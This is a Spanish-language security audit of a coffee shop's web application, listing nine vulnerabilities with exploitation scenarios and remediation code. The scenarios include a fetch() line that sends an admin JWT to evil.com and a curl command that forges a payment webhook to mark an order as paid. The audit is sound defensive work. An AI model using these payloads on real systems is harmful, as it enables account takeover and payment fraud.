# Auditoría de Seguridad — DobleYo Café

**Alcance:** Backend Express + Frontend Astro/React + Auth JWT + Pagos Wompi + API MercadoLibre  
**Fecha:** 2026-05-06  
**Hallazgos confirmados:** 9 (5 HIGH · 3 MEDIUM · 1 LOW)

---

## VULN-001 — Auth bypass vía credenciales DEV sin bloqueo en producción

**Archivo:** `server/routes/auth.js` (líneas ~97–115)  
**Severidad:** HIGH · Confidence: 9/10  
**Categoría:** `auth_bypass`

**Descripción:** El endpoint `POST /api/auth/login` contiene un bloque especial que autentica con las variables `DEV_USER`/`DEV_PASSWORD` y emite un JWT con `role: 'admin'` e `id: 0`. La única referencia a `NODE_ENV` en ese bloque controla el flag `secure` de la cookie, **no bloquea el bypass**. Si `NODE_ENV` no está explícitamente seteado a `'production'` en un ambiente de staging o preview deploy en Vercel, cualquiera con esas credenciales obtiene acceso total de admin.

**Escenario de explotación:** Un ex-empleado con acceso a las variables de entorno, o un staging deploy de Vercel sin `NODE_ENV=production`, permite autenticarse como admin con `POST /api/auth/login { "email": "DEV_USER_val", "password": "DEV_PASS_val" }`. El JWT resultante otorga acceso a todos los endpoints admin: usuarios, finanzas, inventario, operaciones.

**Recomendación:**
```javascript
if (process.env.NODE_ENV === 'production') {
  // Saltar bloque DEV completamente
} else if (email === DEV_USER && password === DEV_PASSWORD) { ... }
```

---

## VULN-002 — Access token JWT almacenado en `localStorage` (XSS-extractable)

**Archivo:** `server/routes/auth.js` (línea ~162) + `public/assets/js/auth-refresh.js` (línea ~31)  
**Severidad:** HIGH · Confidence: 8/10  
**Categoría:** `insecure_token_storage`

**Descripción:** Los endpoints `/api/auth/login` y `/api/auth/refresh` devuelven el `accessToken` en el body JSON (`{ token: accessToken }`). El script `auth-refresh.js` lo persiste en `localStorage.setItem('adminToken', data.token)`. `localStorage` es accesible por cualquier JavaScript en la página, lo que significa que cualquier XSS (extensiones del navegador, contenido inyectado u otros vectores) puede exfiltrar el token. La cookie HttpOnly es correcta, pero el token duplicado en localStorage anula completamente esa protección para el panel admin.

**Escenario de explotación:** Un XSS en cualquier ruta de la aplicación ejecuta `fetch('https://evil.com?t=' + localStorage.getItem('adminToken'))` y obtiene un JWT de admin válido por 15 minutos, renovable desde las cookies de refresh del atacante.

**Recomendación:** Eliminar el campo `token` del body de respuesta de login/refresh. Los endpoints admin deben leer solo la cookie HttpOnly. Actualizar `auth-refresh.js` para no escribir en localStorage.

---

## VULN-003 — Token de verificación de email acepta access tokens de sesión válidos

**Archivo:** `server/routes/auth.js` (líneas ~48, ~68–82)  
**Severidad:** HIGH · Confidence: 9/10  
**Categoría:** `auth_bypass`

**Descripción:** El token de verificación de email se genera con `auth.generateToken({ ...newUser, type: 'verification' })`. El endpoint `GET /api/auth/verify?token=<tok>` verifica la firma con `JWT_SECRET` pero **nunca valida el claim `type`**. Un access token de sesión normal (sin campo `type`) es aceptado como token de verificación válido. El comentario en el código lo reconoce explícitamente: _"Aqui podriamos validar decoded.type === 'verification'"_.

**Escenario de explotación:** Un atacante se registra, obtiene un access token de sesión, y llama `GET /api/auth/verify?token=<access_token>` para verificar cualquier cuenta que controle o para la que haya obtenido un token (vía VULN-002 u otros medios). También permite verificar cuentas de otras personas si se consigue su token por cualquier vía.

**Recomendación:**
```javascript
const decoded = jwt.verify(token, process.env.JWT_SECRET);
if (decoded.type !== 'verification') {
  return res.status(400).json({ success: false, error: 'Token inválido' });
}
```

---

## VULN-004 — Contraseña del admin expuesta en plaintext en respuesta HTTP y logs

**Archivo:** `server/routes/setup.js` (líneas ~481, ~505–509)  
**Severidad:** HIGH · Confidence: 9/10  
**Categoría:** `sensitive_data_exposure`

**Descripción:** El endpoint `POST /api/setup/full-setup` (protegido solo por `SETUP_SECRET_KEY`) loguea explícitamente las credenciales del admin:

```
console.log(`✅ Usuario admin creado: ${ADMIN_EMAIL} / ${ADMIN_PASS}`)
```

Y las devuelve en la respuesta JSON:

```json
{
  "credentials": {
    "email": "admin@dobleyo.cafe",
    "password": "<plaintext>"
  }
}
```

Cualquier sistema que capture stdout (Vercel Logs, Datadog, Sentry) almacena la contraseña en texto plano. La respuesta HTTP también la expone a quien intercepte la llamada de setup.

**Escenario de explotación:** Un desarrollador con acceso al dashboard de Vercel puede ver los logs de función y obtener la contraseña del admin sin necesidad de acceso a la base de datos.

**Recomendación:** Eliminar la contraseña del `console.log` y de la respuesta JSON. Solo confirmar que el usuario fue creado exitosamente.

---

## VULN-005 — Bypass de autorización de finca por bug de sintaxis SQL (`$1` vs `?`)

**Archivo:** `server/middleware/farmAuth.js` (líneas ~30–37)  
**Severidad:** HIGH · Confidence: 8/10  
**Categoría:** `broken_access_control`

**Descripción:** El middleware `assertFarmOwnership` verifica que un caficultor sea dueño de la finca antes de permitir operaciones. Sin embargo, la query usa `$1` (sintaxis PostgreSQL) en lugar de `?` (libSQL/SQLite/Turso), causando un error en runtime. El bloque `try/catch` captura el error silenciosamente y **retorna sin lanzar excepción**, permitiendo que el código llamante continúe sin verificación de propiedad.

```javascript
// farmAuth.js ~línea 32
const row = await query('SELECT caficultor_id FROM farms WHERE slug = $1 LIMIT 1', [farmSlug]);
// ↑ Falla siempre en Turso → catch captura → función retorna sin error → acceso permitido
```

**Escenario de explotación:** Cualquier usuario con rol `caficultor` puede hacer `POST /api/coffee/harvest` con el slug de la finca de un competidor. La verificación de ownership falla silenciosamente y la operación se registra en la base de datos bajo la finca ajena, corrompiendo datos de trazabilidad.

**Recomendación:** Cambiar `$1` por `?` en la query. Adicionalmente, cambiar el comportamiento del catch para que deniegue por defecto en lugar de permitir:

```javascript
} catch (err) {
  throw new Error('No se pudo verificar propiedad de finca'); // deniega en lugar de permitir
}
```

---

## VULN-006 — Webhook Wompi procesa pagos sin verificación de firma cuando `WOMPI_EVENTS_SECRET` está ausente

**Archivo:** `server/routes/orders.js` (líneas ~312, ~326–335)  
**Severidad:** HIGH · Confidence: 9/10  
**Categoría:** `auth_bypass`

**Descripción:** El endpoint `POST /api/orders/wompi/webhook` responde `200 OK` inmediatamente y luego procesa el evento en background. La verificación de firma HMAC es completamente condicional:

```javascript
const WOMPI_EVENTS_SECRET = process.env.WOMPI_EVENTS_SECRET || ''; // vacío si no existe

// Si la variable está vacía (falsy), OMITE la verificación
if (WOMPI_EVENTS_SECRET && checksum && tsStr) {
  // verifica firma
}
// Si no entró al if → continúa procesando el webhook sin validación
```

Si `WOMPI_EVENTS_SECRET` no está configurado (común durante setup inicial o en ambientes de staging), cualquier payload arbitrario actualiza el estado del pedido a `APPROVED`.

**Escenario de explotación:**

```bash
curl -X POST https://dobleyo.cafe/api/orders/wompi/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "event": "transaction.updated",
    "data": {
      "transaction": {
        "reference": "DY-1234-ABCD",
        "status": "APPROVED",
        "id": "fake-id",
        "payment_method_type": "card"
      }
    }
  }'
```

Esto marca el pedido `DY-1234-ABCD` como pagado y envía email de confirmación, sin pago real.

**Recomendación:** Si `WOMPI_EVENTS_SECRET` no está configurado, rechazar el webhook con error:

```javascript
if (!WOMPI_EVENTS_SECRET) {
  return res.status(400).json({ error: 'Webhook no configurado' });
}
```

---

## VULN-007 — IDOR: órdenes de clientes accesibles públicamente por referencia enumerable

**Archivo:** `server/routes/orders.js` (líneas ~185–221)  
**Severidad:** MEDIUM · Confidence: 8/10  
**Categoría:** `idor` / `sensitive_data_exposure`

**Descripción:** `GET /api/orders/:ref` no requiere autenticación y devuelve: nombre del cliente, email, ciudad de envío, totales financieros e ítems del pedido. El formato de referencia `DY-{timestamp_ms}-{4hex}` (65,536 combinaciones × timestamp aproximado) permite enumerar órdenes de una ventana de tiempo conocida (ej. durante una campaña de ventas).

**Escenario de explotación:** Dado un timestamp aproximado de una campaña conocida, un atacante puede iterar `DY-1746500000000-XXXX` en ~65K requests y extraer nombre + email de todos los compradores de ese período.

**Recomendación:** Requerir autenticación para ver detalles de orden, o al menos limitar los campos expuestos públicamente a estado del pedido sin PII. Alternativamente, usar UUID v4 como referencia pública.

---

## VULN-008 — Endpoint de debug expone credenciales en query string y logs

**Archivo:** `api/debug_login.js` (líneas ~13–14) + `api/index.js` (líneas ~125–149)  
**Severidad:** MEDIUM · Confidence: 9/10  
**Categoría:** `sensitive_data_exposure`

**Descripción:** Dos problemas relacionados:

1. **`/api/debug-login`** acepta `email` y `password` como parámetros GET (`?email=x&password=y`). Las credenciales quedan en: logs de Vercel, historial del navegador, y cualquier proxy/CDN en la ruta. La protección `NODE_ENV === 'production'` puede fallar en deploys de preview.

2. **`GET /api/debug/config?key=<SETUP_SECRET_KEY>`** autentica pasando un secreto en query string, exponiéndolo en todos los mismos lugares.

**Recomendación:** Eliminar completamente `debug_login.js` y el endpoint `/api/debug/config` de cualquier código que llegue a producción o staging. Si son necesarios para desarrollo local, protegerlos con middleware de `NODE_ENV` a nivel de registro del router, no solo dentro del handler.

---

## VULN-009 — Error interno de base de datos expuesto en respuestas de producción

**Archivo:** `server/routes/inventory.js` (y múltiples otros routers)  
**Severidad:** LOW · Confidence: 8/10  
**Categoría:** `sensitive_data_exposure`

**Descripción:** Los handlers de error en múltiples routers devuelven `error.message` directamente: `res.status(500).json({ success: false, error: error.message })`. Los mensajes de error de libSQL/Turso incluyen: nombres de tablas, fragmentos de queries SQL, nombres de columnas y paths internos. Esta información facilita el reconocimiento para ataques posteriores.

**Recomendación:** En producción, devolver siempre un mensaje genérico y loguear el error real internamente:

```javascript
} catch (err) {
  console.error('[route] Error:', err);
  res.status(500).json({ success: false, error: 'Error interno del servidor' });
}
```

---

## Hallazgos descartados (falsos positivos)

| Hallazgo | Razón del descarte |
|----------|--------------------|
| XSS en templates de email HTML | Los clientes de correo modernos no ejecutan JavaScript. Impacto nulo. |
| CORS permite `origin: null` | Las cookies tienen `SameSite=lax`, lo que mitiga el riesgo de CSRF correctamente. |
| Desuscripción newsletter sin token | Impacto bajo: acción reversible, sin exposición de datos sensibles. |

---

## Resumen ejecutivo y plan de acción

| # | Severidad | Hallazgo | Archivo principal | Prioridad |
|---|-----------|----------|-------------------|-----------|
| 001 | **HIGH** | Dev bypass de login sin bloqueo real en producción | `routes/auth.js` | Inmediata |
| 002 | **HIGH** | JWT de admin almacenado en localStorage | `auth-refresh.js` | Inmediata |
| 003 | **HIGH** | Token de verificación acepta access tokens de sesión | `routes/auth.js` | Inmediata |
| 004 | **HIGH** | Contraseña admin en plaintext en respuesta HTTP y logs | `routes/setup.js` | Inmediata |
| 005 | **HIGH** | Bypass de autorización de finca por bug `$1` vs `?` | `middleware/farmAuth.js` | Inmediata |
| 006 | **HIGH** | Webhook Wompi sin verificación si secret no configurado | `routes/orders.js` | Inmediata |
| 007 | **MEDIUM** | IDOR: datos de clientes accesibles sin autenticación | `routes/orders.js` | Corto plazo |
| 008 | **MEDIUM** | Credenciales y secrets en query string de debug endpoints | `api/debug_login.js` | Corto plazo |
| 009 | **LOW** | Mensajes de error internos de BD expuestos en API | múltiples routers | Medio plazo |

### Acciones inmediatas (antes del próximo deploy a producción)

1. **VULN-001:** Envolver el bloque DEV en `if (process.env.NODE_ENV !== 'production')` a nivel de bloque completo.
2. **VULN-002:** Dejar de devolver `token` en el body JSON. Eliminar `localStorage.setItem` en `auth-refresh.js`.
3. **VULN-003:** Agregar validación `decoded.type !== 'verification'` en el endpoint `/api/auth/verify`.
4. **VULN-004:** Quitar contraseña del `console.log` y de la respuesta de setup.
5. **VULN-005:** Corregir `$1` → `?` en `farmAuth.js` y hacer que el catch deniegue por defecto.
6. **VULN-006:** Rechazar webhooks cuando `WOMPI_EVENTS_SECRET` esté vacío.
